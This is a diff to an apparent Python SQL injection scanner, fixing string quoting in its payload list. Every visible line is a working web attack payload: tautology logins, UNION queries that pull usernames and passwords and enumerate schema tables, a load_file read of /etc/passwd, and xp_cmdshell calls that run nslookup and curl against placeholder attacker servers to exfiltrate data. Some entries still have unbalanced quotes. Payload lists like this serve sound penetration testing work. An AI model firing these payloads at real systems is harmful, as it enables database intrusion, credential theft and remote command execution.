@@ -36,12 +36,12 @@ logger.addHandler(color_handler)
 SQL_PAYLOADS = [
     # Classic (Error-Based) SQLi Payloads
     "' OR 1=1 --", 
-    '" OR "a"="a',
+    '" OR "a"="a"',
     "' OR 'a'='a' --",
     '" OR 1=1#',
     "' OR 1=1 --",
     "'; SELECT 1 --",  
-    '" OR 1=1 #",  
+    '" OR 1=1 #',  
     "' OR 1=1 /*",  
 
     # Union-Based SQLi Payloads
@@ -49,7 +49,7 @@ SQL_PAYLOADS = [
     "' UNION SELECT null, username, password FROM users --",  
     '" UNION SELECT null, username, password FROM users --',  
     "' UNION SELECT null, group_concat(table_name), null FROM information_schema.tables --",  
-    '" UNION SELECT null, group_concat(column_name), null FROM information_schema.columns WHERE table_name = "users" --",  
+    '" UNION SELECT null, group_concat(column_name), null FROM information_schema.columns WHERE table_name = "users" --"',  
     "' UNION SELECT null, group_concat(username, ':', password), null FROM users --",  
     "' UNION SELECT null, database(), null --",  
     '" UNION SELECT null, version(), null --",  
@@ -77,9 +77,9 @@ SQL_PAYLOADS = [
 
     # Out-of-Band (OOB) SQLi Payloads
     "'; EXEC xp_cmdshell('nslookup your_custom_dns_server.com') --",  
-    '" OR 1=1 UNION SELECT null, load_file('/etc/passwd') --",  
+    '" OR 1=1 UNION SELECT null, load_file(\'/etc/passwd\') --",  
     "'; EXEC xp_cmdshell('curl http://your_custom_server.com/data') --",  
-    '" OR 1=1 UNION SELECT null, sys.eval('cmd') --",  
+    '" OR 1=1 UNION SELECT null, sys.eval(\'cmd\') --"',  
 
     # Second-Order SQLi Payloads
     "admin' --",  
